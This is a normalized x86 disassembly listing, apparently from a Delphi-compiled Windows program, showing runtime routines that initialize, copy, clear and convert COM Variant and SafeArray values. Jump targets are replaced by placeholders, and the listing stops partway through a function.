mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40f2a8
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f14c
mov eax [ ebp - 0x314 ]
call sub_40f4fc
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f480
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40f14c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404118
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_414a10
test al al
je r-xdata
mov eax ebx
call sub_40f304
jmp r-xdata
push ebx
call VariantClear
call sub_40f14c
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f518
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f548
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f548
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f5a4
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40f14c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40f14c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f4fc
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40eea4
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40f14c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40f14c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f518
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f548
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f14c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40f14c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f778
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f480
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40f14c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40416c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_414a10
test al al
je r-xdata
mov ecx sub_40f770
mov edx esi
mov eax ebx
call sub_40f5a4
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40f14c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f824
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f778
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f480
sub_40f868
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f8c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f824
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40faf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8cb
lea eax [ ebp - 0x10 ]
call sub_40f4fc
retn
sub_40f8d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f912
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412f3c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4138ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f919
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
sub_40f920
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f95e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412814
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4138c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f965
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40f96c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f9aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4135e0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9b1
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
sub_40f9b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f9f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413514
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9fd
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
sub_40fa04
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40faf0
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40f158
jmp r-xdata
mov edx esi
call sub_40ecc4
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40f158
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40fa84
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_414a10
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f868
jmp r-xdata
mov edx esp
mov eax esi
call sub_414a10
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40fa04
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40faf0
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f824
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40faf0
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fb35 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f920
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40f264
jmp r-xdata
mov eax ebx
call sub_41045c
mov edx eax
mov eax esi
call sub_413768
jmp r-xdata
mov eax ebx
call sub_40feb4
mov edx eax
mov eax esi
call sub_4136c8
jmp r-xdata
mov eax ebx
call sub_411820
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4137b4
jmp r-xdata
mov eax ebx
call sub_411488
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4137d8
jmp r-xdata
mov eax ebx
call sub_412160
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413804
jmp r-xdata
mov eax ebx
call sub_411bf8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413830
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f8d4
jmp r-xdata
mov eax ebx
call sub_410f74
mov edx eax
mov eax esi
call sub_41385c
jmp r-xdata
mov eax ebx
call sub_410304
mov edx eax
mov eax esi
call sub_413748
jmp r-xdata
mov eax ebx
call sub_4103b4
mov edx eax
mov eax esi
call sub_4136e8
jmp r-xdata
mov eax ebx
call sub_410554
mov edx eax
mov eax esi
call sub_413708
jmp r-xdata
mov eax ebx
call sub_41062c
mov edx eax
mov eax esi
call sub_413728
jmp r-xdata
mov eax ebx
call sub_410978
push edx
push eax
mov eax esi
call sub_413788
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f96c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f9b8
jmp r-xdata
mov dx 0x101
call sub_40ecc4
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f4fc
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40fa84
xor edx edx
mov ax 0x1
call sub_40ecc4
jmp r-xdata
sub_40fd1c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fdbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412f3c
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4043a0
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_40869c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fdc6
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_4047f8
retn
mov eax ebx
call sub_410f74
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40f158
jmp r-xdata
sub_40fdd0
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40f158
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fe0c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fe60
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f824
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40feb4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe67
lea eax [ ebp - 0x14 ]
call sub_40f4fc
retn
sub_40fe70
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414a10
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40feb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4102d5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fee7 ]
mov eax [ ebp - 0x4 ]
call sub_40fd1c
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd1c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40feb4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fdd0
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe0c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40ecc4
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fe70
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fdd0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40fdd0
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_41010b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd1c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40feb4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40325c
sub_410304
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40ecc4
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410390
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40feb4
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40325c
sub_4103b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40ecc4
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410437
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40feb4
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40325c
sub_41045c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410530
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40feb4
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410482 ]
jmp [ eax * 4 + jump_table_410494 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40325c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40ecc4
sub_410554
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_410609
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40feb4
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410576 ]
jmp [ eax * 4 + jump_table_410589 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40325c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40ecc4
sub_41062c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4106f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410978
test edx edx
je r-xdata
mov al [ eax + lookup_table_410652 ]
jmp [ eax * 4 + jump_table_410666 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40325c
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40ecc4
sub_410714
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402abc
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40f158
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410f74
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_4107c0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4108ae
